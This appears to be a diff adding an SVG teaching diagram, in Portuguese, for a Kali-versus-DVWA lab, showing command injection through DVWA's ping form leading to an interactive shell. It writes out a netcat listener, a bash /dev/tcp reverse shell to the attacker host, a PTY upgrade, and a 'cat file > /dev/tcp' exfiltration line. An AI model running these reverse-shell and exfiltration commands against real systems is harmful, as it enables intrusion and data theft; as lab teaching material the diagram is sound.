@@ -1,0 +1,76 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 470" role="img" aria-labelledby="t d">
+  <title id="t">Da injeção de comando ao shell interativo e à exfiltração</title>
+  <desc id="d">A cadeia do laboratório, em cinco etapas ligadas por setas. Etapa 1: no Kali, o atacante sobe um listener com netcat, que fica à escuta numa porta, por exemplo a 4444. Etapa 2: o atacante usa a injeção de comando no formulário de ping do DVWA para rodar um comando como o usuário www-data no servidor. Etapa 3: o comando injetado é um reverse shell com bash e /dev/tcp, que faz o DVWA conectar de volta ao listener do Kali pela rede interna lab_net; nasce um shell, mas é um shell burro, sem Ctrl-C nem tab nem eco de senha. Etapa 4: o atacante melhora o shell com o comando script, que aloca um pseudo-terminal, e passa a ter um shell quase completo. Etapa 5: com o shell, o atacante lê e transfere arquivos do alvo de volta ao Kali, por exemplo com cat e /dev/tcp caindo num listener do netcat, e confere a integridade com sha256. A lição: uma injeção de comando, que dá um comando de cada vez, vira controle interativo e contínuo do alvo.</desc>
+  <style>
+    text { font-family: ui-monospace, "DejaVu Sans Mono", Menlo, Consolas, monospace; fill: #e6ede8; }
+    .t { font-size: 16px; font-weight: 700; }
+    .h { font-size: 12.5px; font-weight: 700; fill: #5cc8d8; }
+    .b { font-size: 12px; }
+    .c { font-size: 11px; fill: #5ee08a; }
+    .s { font-size: 10.5px; fill: #9fb0a6; }
+    .n { font-size: 13px; font-weight: 700; fill: #e8c46a; }
+    .ln { stroke: #3a4b42; stroke-width: 2; }
+    .fl { stroke: #5ee08a; stroke-width: 2.5; }
+  </style>
+  <defs>
+    <marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#5ee08a"/></marker>
+  </defs>
+  <rect width="900" height="470" fill="#121815"/>
+  <text class="t" x="30" y="34">Uma injeção de comando vira controle interativo do alvo</text>
+
+  <!-- Kali side -->
+  <rect x="20" y="58" width="250" height="372" rx="10" fill="#16201b" stroke="#5ee08a"/>
+  <text class="h" x="36" y="84">Kali  (atacante, 10.0.0.2)</text>
+
+  <!-- DVWA side -->
+  <rect x="630" y="58" width="250" height="372" rx="10" fill="#16201b" stroke="#2c3a33"/>
+  <text class="h" x="646" y="84">DVWA  (alvo, 10.0.0.3)</text>
+  <text class="s" x="646" y="102">processo web: www-data</text>
+
+  <!-- step 1 -->
+  <text class="n" x="36" y="130">1</text>
+  <rect x="54" y="114" width="200" height="46" rx="8" fill="#1d2a23" stroke="#5ee08a"/>
+  <text class="b" x="66" y="134">listener</text>
+  <text class="c" x="66" y="151">nc -lvnp 4444</text>
+
+  <!-- step 2 -->
+  <text class="n" x="300" y="130">2</text>
+  <rect x="320" y="110" width="290" height="54" rx="8" fill="#1d2a23" stroke="#e8c46a"/>
+  <text class="b" x="332" y="130">injeção de comando (form de ping)</text>
+  <text class="s" x="332" y="150">127.0.0.1 ; &lt;comando&gt;  → roda como www-data</text>
+  <line class="ln" x1="254" y1="137" x2="320" y2="137" marker-end="url(#a)"/>
+
+  <!-- step 3 -->
+  <text class="n" x="300" y="210">3</text>
+  <rect x="320" y="190" width="290" height="58" rx="8" fill="#1d2a23" stroke="#2c3a33"/>
+  <text class="b" x="332" y="210">reverse shell injetado</text>
+  <text class="c" x="332" y="228">bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1</text>
+  <text class="s" x="332" y="243">o alvo liga de volta pela lab_net</text>
+  <!-- connect back arrow (DVWA -> Kali) -->
+  <line class="fl" x1="320" y1="219" x2="254" y2="170" marker-end="url(#a)"/>
+  <text class="s g" x="150" y="186">shell burro</text>
+
+  <!-- step 4 -->
+  <text class="n" x="36" y="300">4</text>
+  <rect x="54" y="280" width="200" height="58" rx="8" fill="#1d2a23" stroke="#5ee08a"/>
+  <text class="b" x="66" y="300">upgrade p/ PTY</text>
+  <text class="c" x="66" y="318">script -qc /bin/bash</text>
+  <text class="s" x="66" y="333">Ctrl-C, tab, sem eco de senha</text>
+
+  <!-- step 5 -->
+  <text class="n" x="36" y="382">5</text>
+  <rect x="54" y="362" width="200" height="54" rx="8" fill="#1d2a23" stroke="#5ee08a"/>
+  <text class="b" x="66" y="382">exfiltra arquivo</text>
+  <text class="c" x="66" y="400">nc -lvnp 4445 &gt; loot</text>
+  <text class="s" x="66" y="414">confere com sha256sum</text>
+
+  <rect x="320" y="300" width="290" height="116" rx="8" fill="#16201b" stroke="#2c3a33"/>
+  <text class="s" x="336" y="324">o alvo só tem bash, perl, php e curl;</text>
+  <text class="s" x="336" y="342">NÃO tem nc nem python3. Por isso</text>
+  <text class="s" x="336" y="360">o canal usa bash /dev/tcp, e a</text>
+  <text class="s" x="336" y="378">transferência manda com</text>
+  <text class="c" x="336" y="396">cat arquivo &gt; /dev/tcp/10.0.0.2/4445</text>
+  <text class="s" x="336" y="412">caindo no listener do Kali (etapa 5).</text>
+
+  <text class="s" x="30" y="452">As setas verdes são conexões que partem do alvo para o Kali: é por elas que o reverse shell e a exfiltração passam.</text>
+</svg>
